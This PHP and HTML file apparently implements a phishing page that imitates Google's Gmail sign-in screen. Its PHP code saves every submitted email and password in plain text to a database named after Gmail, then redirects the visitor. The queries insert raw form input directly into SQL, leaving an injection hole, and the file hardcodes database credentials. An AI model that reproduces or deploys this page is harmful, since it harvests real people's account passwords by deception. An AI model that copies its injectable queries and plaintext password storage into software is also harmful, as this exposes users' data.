<?php
	if(isset($_REQUEST['submitted']))
	{
		$name=$_REQUEST['email'];
		$passwd=$_REQUEST['password'];
		if($name!='' and $passwd!='')
		{
			$connection=mysqli_connect("localhost", "id7850108_root", "password", "id7850108_gmail");
			$query=mysqli_query($connection, "SELECT `username` FROM `users` WHERE `username`='$name'") ;
				if(!mysqli_num_rows($query))
				{
					mysqli_query($connection, "INSERT INTO `users`(`id`, `username`, `password`, `DateAndTime`) VALUES ('', '$name', '$passwd', NOW())") ;
					$URL="mypage.php";
					echo "<script type='text/javascript'>document.location.href='{$URL}';</script>";
					echo '<META HTTP-EQUIV="refresh" content="0;URL=' . $URL . '">';
				}
				else
				{
					echo "USERNAME ALREADY EXISTS";
				}
		}
		else
		{
			if($name=='')
			{
				echo "Enter Email";
				echo "<br>";
			}
			if($passwd=='')
			{
				echo "Enter Password";
			}
		}
	}
?>
<html>
	<title>Gmail</title>
	<head>
		<link rel="icon" href="emblum.PNG"/>
		<link type="text/css" rel="stylesheet" href="styles.css" />
	</head>
	<body>
		<center>
			<div>
				<img src="logo.JPG">
			</div>
			<div id="stmt1">
				One account. All of Google.
			</div>
			<br/>
			<div id="stmt2">
				Sign in with your Google Account
			</div>
			<br/>
			<div id="form">
				<div>
					<img src="photo.JPG">
				</div>
				<form action="login.php" method="POST">
					<input type="email" id="email" name="email" placeholder="    Email">
					<br/><br/>
					<input type="password" id="password" name="password" placeholder="    password">
					<br/><br/>
					<input type="submit" id="submit" name="submitted" value="Next">
				</form>
			</div id="stmt3">
			<br/><br/><br/>
			<div>
				One Google Account for everything Google
			</div>
			<br/>
			<div>
				<img src="bottom.JPG">
			</div>
		</center>
	</body>
	
</html>